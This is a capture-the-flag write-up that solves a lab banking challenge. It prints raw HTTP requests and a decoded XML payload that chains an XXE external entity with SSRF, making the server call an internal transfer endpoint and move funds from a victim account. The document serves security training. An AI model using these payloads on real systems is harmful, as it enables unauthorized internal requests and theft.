Solution
========

This challenge was the conclusion of a series of challenges, all connected together through a story, and so you need some information collected in the previous ones.

The first step is to login in the application and understand how it works. You can login using the credentials `nakemeigbo1@sapo.pt:h9AvhRDPDKSfxpBqfMer9FzD`, obtained in the previous challenge. You also know, from other previous challenge, that your victim is `bruce@shaydmail.org`.

Your account has already some balance, so you can use it to test the application. Transfer 1 bitcoin to `bruce@shaydmail.org` and notice the request being made:


```HTTP
POST /operations.php HTTP/1.1
Host: localhost:8050
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: */*
Accept-Language: pt,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://localhost:8050/account.php
Content-Length: 253
Cookie: PHPSESSID=cda8441cc2e3122cfe048fcc587e0dff
DNT: 1
Connection: close

xml=%3C%3Fxml+version%3D'1.0'+encoding%3D'ISO-8859-1'%3F%3E%3Ctransfer%3E%3Cto%3Ebruce%40shaydmail.org%3C%2Fto%3E%3Cfrom%3Enakemeigbo1%40sapo.pt%3C%2Ffrom%3E%3Camount%3E1%3C%2Famount%3E%3Cid%3Ecda8441cc2e3122cfe048fcc587e0dff%3C%2Fid%3E%3C%2Ftransfer%3E

```

The `xml` parameter seens promissing. Here, url-decoded and with linebreaks for clarity:

```XML
<?xml+version='1.0'+encoding='ISO-8859-1'?>
<transfer>
    <to>bruce@shaydmail.org</to>
    <from>nakemeigbo1@sapo.pt</from>
    <amount>1</amount>
    <id>cda8441cc2e3122cfe048fcc587e0dff</id>
</transfer>
```

Playing with the XML to trigger an error message, for instance by deleting the `<to>`. You get an error message showing some code:

```PHP
Error near line 20:

if (!account->get($from)) {
   throw new Exception('Invalid account');
}

// transfer between 2 accounts
$endpoint .= "/transfer.php?from=$from&to=$to&amount=$amount&id=$id";
```

From this you infer the `POST` with the XML triggers a backend request to `$endpoint`. You don't know to which hostname is the request being made, but the obvious guess is `localhost`.

So, right now you must be thinking *What if I invoke that internal endpoint switching the values of `to` and `from`, with the `amount` of 1000000*?

You can do that with a combination of an [XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) and a [SSRF](https://cfdb.io/Web/Server-Side%20Request%20Forgery).

It is easier to detect and validate the XXE fetching an external entity that points to a server you control, but we will go immediately for the solution:

```HTTP
POST /operations.php HTTP/1.1
Host: localhost:8050
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: */*
Accept-Language: pt,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://localhost:8050/account.php
Content-Length: 523
Cookie: PHPSESSID=cda8441cc2e3122cfe048fcc587e0dff
DNT: 1
Connection: close

xml=%3C%3Fxml%20version%3D%271.0%27%20encoding%3D%27ISO-8859-1%27%3F%3E%3C!DOCTYPE%20xxx%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Flocalhost%2Ftransfer.php%3Fto%3Dnakemeigbo1%40sapo.pt%26from%3Dbruce%40shaydmail.org%26amount%3D1000000%26id%3Dcda8441cc2e3122cfe048fcc587e0dff%22%20%3E%5D%3E%3Ctransfer%3E%3Ca%3E%26xxe%3B%3C%2Fa%3E%3Cto%3Ebruce%40shaydmail.org%3C%2Fto%3E%3Cfrom%3Enakemeigbo1%40sapo.pt%3C%2Ffrom%3E%3Camount%3E1%3C%2Famount%3E%3Cid%3Ecda8441cc2e3122cfe048fcc587e0dff%3C%2Fid%3E%3C%2Ftransfer%3E
```

Decoded, with linebreaks:
```XML
<?xml version='1.0' encoding='ISO-8859-1'?>
<!DOCTYPE xxx [<!ENTITY xxe SYSTEM "http://localhost/transfer.php?to=nakemeigbo1@sapo.pt&from=bruce@shaydmail.org&amount=1000000&id=cda8441cc2e3122cfe048fcc587e0dff" >]>
<transfer>
    <a>&xxe;</a>
    <to>bruce@shaydmail.org</to>
    <from>nakemeigbo1@sapo.pt</from>
    <amount>1</amount>
    <id>cda8441cc2e3122cfe048fcc587e0dff</id>
</transfer>
```

The server replies with:

```
success. Refresh to update your balance
```

meaning the transfer in the legit part of the XML went through. The only way to get feedback about our piggybacked request to the internal endpoint is to refresh your browser window and see if the balance was affected.

![Success]
(screenshots/success.png)

And it was! Success!


Flag
----

`1195254`

